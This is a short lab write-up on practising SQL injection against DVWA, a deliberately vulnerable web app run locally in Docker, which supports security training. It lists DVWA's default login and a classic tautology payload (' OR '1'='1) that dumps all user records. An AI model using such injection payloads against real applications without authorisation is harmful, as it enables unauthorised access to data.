# SQL Injection Lab using DVWA

## Objective
Practice and understand SQL Injection vulnerabilities using the Damn Vulnerable Web Application (DVWA).

## Setup

- Ran DVWA directly using Docker Hub image:
  
  ```bash
  docker run --rm -it -p 8081:80 vulnerables/web-dvwa
  ```

- Accessed DVWA at:

  ```
  http://localhost:8081
  ```
 - Logged in with default credentials:
    - **Username**: `admin`
    - **Password**: `password`

- Initialized the database by clicking **Create / Reset Database**
- Set **Security Level** to **Low** (under `DVWA Security` menu)

---
## Testing SQL Injection

### Test 1: Basic ID Query

- Entered `1` into the **User ID** field and clicked **Submit**
- Result:

  ```
  ID: 1
  First name: admin
  Surname: admin
  ```

The application is vulnerable — it returns database records directly.

---
### Test 2: Bypass Authentication Logic

- Entered the following input:

  ```sql
  test1' OR '1'='1
  ```

- Output showed **multiple user records**:

  ```
  ID: test1' or '1'='1
  First name: admin
  Surname: admin

  ID: test1' or '1'='1
  First name: Gordon
  Surname: Brown

  ```

SQL logic was bypassed — `OR '1'='1'` returned **all rows**.
